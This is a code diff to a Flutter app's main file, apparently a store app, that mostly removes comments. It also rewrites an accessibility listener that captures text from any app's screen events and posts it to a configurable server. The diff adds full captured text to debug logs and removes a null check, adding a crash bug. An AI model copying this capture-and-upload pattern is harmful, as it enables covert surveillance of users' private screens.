@@ -39,7 +39,6 @@ const String apiUrl = "https://api.xcreate.my.id/myxcreate/cek_update_apk.php";
 /// Global navigator key
 final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();
 
-// ===================== Accessibility Overlay entrypoint (jika ingin overlay) =====================
 @pragma('vm:entry-point')
 void accessibilityOverlay() {
   runApp(const MaterialApp(
@@ -49,7 +48,6 @@ void accessibilityOverlay() {
     ),
   ));
 }
-// ================================================================================================
 
 Future<void> main() async {
   WidgetsBinding widgetsBinding = WidgetsFlutterBinding.ensureInitialized();
@@ -75,7 +73,6 @@ Future<void> main() async {
 
   runApp(MyApp(initialPage: initialPage));
 
-  // Listener data dari Foreground Service
   FlutterForegroundTask.addTaskDataCallback((event) {
     debugPrint('[Main] Event diterima dari FGTask: $event');
     _handleIncomingNotification(event);
@@ -86,7 +83,7 @@ Future<void> main() async {
   FlutterNativeSplash.remove();
 }
 
-/// Handler untuk setiap notifikasi yang dikirim dari MyAccessibilityService atau dari accessibility stream
+/// Handler notifikasi / accessibility event
 Future<void> _handleIncomingNotification(dynamic event) async {
   try {
     if (event is Map) {
@@ -94,7 +91,6 @@ Future<void> _handleIncomingNotification(dynamic event) async {
       final text = (event['text']?.toString() ?? '(kosong)');
       final prefs = await SharedPreferences.getInstance();
 
-      // Simpan log (versi flutter)
       final logs = prefs.getStringList('notif_logs') ?? [];
       final logEntry = jsonEncode({
         "title": title,
@@ -104,7 +100,6 @@ Future<void> _handleIncomingNotification(dynamic event) async {
       logs.add(logEntry);
       await prefs.setStringList('notif_logs', logs);
 
-      // Simpan log native JSON array
       final nativeJson = prefs.getString('notif_logs_native') ?? '[]';
       final List<dynamic> nativeLogs = jsonDecode(nativeJson);
       nativeLogs.add({
@@ -114,11 +109,9 @@ Future<void> _handleIncomingNotification(dynamic event) async {
       });
       await prefs.setString('notif_logs_native', jsonEncode(nativeLogs));
 
-      // Simpan last notification
       await prefs.setString('last_notif_title', title);
       await prefs.setString('last_notif_text', text);
 
-      // Post ke server jika URL tersedia
       final postUrl = prefs.getString('notif_post_url') ?? '';
       if (postUrl.isNotEmpty) {
         try {
@@ -146,7 +139,7 @@ Future<void> _handleIncomingNotification(dynamic event) async {
   }
 }
 
-/// Init Foreground Task (sama seperti sebelumnya)
+/// Init Foreground Task
 void _initForegroundTaskGlobal() {
   try {
     FlutterForegroundTask.init(
@@ -179,23 +172,18 @@ void _initForegroundTaskGlobal() {
 Future<void> _ensureForegroundServiceRunningIfNeeded() async {
   try {
     final prefs = await SharedPreferences.getInstance();
-    final shouldRun =
-        prefs.getBool('notif_stream_running') ?? true; // default true
+    final shouldRun = prefs.getBool('notif_stream_running') ?? true;
     if (!shouldRun) return;
 
     final isRunning = await FlutterForegroundTask.isRunningService;
     if (isRunning == true) {
-      debugPrint('[FG] Service already running (no action).');
+      debugPrint('[FG] Service already running.');
       return;
     }
 
     final postUrl = prefs.getString('notif_post_url') ?? '';
     if (postUrl.isNotEmpty) {
-      try {
-        await FlutterForegroundTask.saveData(key: 'postUrl', value: postUrl);
-      } catch (e) {
-        debugPrint('[FG] Gagal saveData postUrl sebelum start: $e');
-      }
+      await FlutterForegroundTask.saveData(key: 'postUrl', value: postUrl);
     }
 
     await FlutterForegroundTask.startService(
@@ -211,7 +199,7 @@ Future<void> _ensureForegroundServiceRunningIfNeeded() async {
       },
     );
 
-    debugPrint('[FG] Foreground service started by main (auto-start).');
+    debugPrint('[FG] Foreground service started.');
   } catch (e) {
     debugPrint('[FG] Failed to ensure FG service: $e');
   }
@@ -259,7 +247,6 @@ Future<Widget> _checkLoginAndVersion() async {
   return const LoginPage();
 }
 
-/// Bandingkan versi aplikasi
 bool _isVersionLower(String current, String latest) {
   final currParts =
       current.split('.').map((e) => int.tryParse(e) ?? 0).toList();
@@ -279,7 +266,6 @@ bool _isVersionLower(String current, String latest) {
   return false;
 }
 
-/// MyApp (tidak banyak berubah)
 class MyApp extends StatelessWidget {
   final Widget initialPage;
   const MyApp({super.key, required this.initialPage});
@@ -320,7 +306,6 @@ class MyApp extends StatelessWidget {
   }
 }
 
-/// DeepLink Wrapper (tempat kita inisialisasi accessibility listener)
 class DeepLinkWrapper extends StatefulWidget {
   final Widget initialPage;
   const DeepLinkWrapper({super.key, required this.initialPage});
@@ -344,7 +329,6 @@ class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
       _handleLink(uri);
     });
 
-    // Mulai inisialisasi accessibility (jika ada)
     _initAccessibilityListener();
   }
 
@@ -356,27 +340,16 @@ class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
 
   Future<void> _initAccessibilityListener() async {
     try {
-      debugPrint('[ACC] Memeriksa permission accessibility...');
       final enabled =
           await FlutterAccessibilityService.isAccessibilityPermissionEnabled();
       if (!enabled) {
-        debugPrint(
-            '[ACC] Permission belum diberikan. Meminta user memberi izin...');
-        // Men-trigger settings accessibility
         final granted =
             await FlutterAccessibilityService.requestAccessibilityPermission();
-        debugPrint('[ACC] Hasil request permission: $granted');
-        // Jika user menolak, kita tidak akan coba listen
         if (!granted) {
-          debugPrint(
-              '[ACC] User belum mengaktifkan accessibility, skip listen');
+          debugPrint('[ACC] User belum mengaktifkan accessibility');
           return;
         }
-      } else {
-        debugPrint('[ACC] Accessibility permission sudah aktif.');
       }
-
-      // Mulai listen stream accessibility
       _startAccessibilityStream();
     } catch (e, st) {
       debugPrint('[ACC] Error inisialisasi accessibility: $e\n$st');
@@ -384,41 +357,39 @@ class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
   }
 
   void _startAccessibilityStream() {
-    try {
-      // jika sudah ada subscription, batalkan dulu
-      _accessSub?.cancel();
+    _accessSub?.cancel();
 
-      _accessSub =
-          FlutterAccessibilityService.accessStream.listen((event) async {
-        final title = event.packageName ?? '(unknown)';
-        // capturedText kadang null; gunakan nodesText atau capturedText
-        String text = event.capturedText ?? '';
-        if ((text.isEmpty) &&
-            (event.nodesText != null && event.nodesText!.isNotEmpty)) {
-          text = event.nodesText!.join(' ');
+    _accessSub = FlutterAccessibilityService.accessStream.listen((event) async {
+      final pkg = event.packageName ?? '(unknown)';
+
+      String text = '';
+      if (event.text != null) {
+        if (event.text is Iterable) {
+          // kalau berupa List/Iterable
+          text = (event.text as Iterable).map((e) => e.toString()).join(" ");
+        } else {
+          // kalau berupa String tunggal
+          text = event.text.toString();
         }
-        if (text.isEmpty) {
-          // fallback: info event type
-          text = event.eventType?.toString() ?? '(no text)';
-        }
+      }
 
-        final mapped = {
-          'title': title,
-          'text': text,
-          'raw_event': event.toString(),
-        };
+      if (text.isEmpty) {
+        text = event.eventType?.toString() ?? '(no text)';
+      }
 
-        debugPrint('[ACC] Event -> title: $title, text-length: ${text.length}');
-        // Kirim ke handler existing (akan simpan ke prefs + post ke URL jika ada)
-        await _handleIncomingNotification(mapped);
-      }, onError: (err) {
-        debugPrint('[ACC] Error stream accessibility: $err');
-      }, cancelOnError: false);
+      final mapped = {
+        'title': pkg,
+        'text': text,
+        'raw_event': event.toString(),
+      };
 
-      debugPrint('[ACC] Accessibility stream started.');
-    } catch (e, st) {
-      debugPrint('[ACC] Gagal mulai accessibility stream: $e\n$st');
-    }
+      debugPrint('[ACC] Event -> pkg: $pkg, text: $text');
+      await _handleIncomingNotification(mapped);
+    }, onError: (err) {
+      debugPrint('[ACC] Error stream accessibility: $err');
+    }, cancelOnError: false);
+
+    debugPrint('[ACC] Accessibility stream started.');
   }
 
   Future<void> _initUri() async {
@@ -448,7 +419,7 @@ class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
 
   @override
   Widget build(BuildContext context) {
-    if (_pendingUri != null && _pendingUri!.host == "xcreate.my.id") {
+    if (_pendingUri!.host == "xcreate.my.id") {
       final idProduk = _pendingUri!.queryParameters['idproduk'];
       if (idProduk != null) {
         return DetailPage(idProduk: idProduk);
@@ -459,13 +430,6 @@ class _DeepLinkWrapperState extends State<DeepLinkWrapper> {
   }
 }
 
-extension on AccessibilityEvent {
-  get capturedText => null;
-
-  get nodesText => null;
-}
-
-/// Custom Splash
 class CustomSplashPage extends StatefulWidget {
   final Widget nextPage;
   const CustomSplashPage({super.key, required this.nextPage});
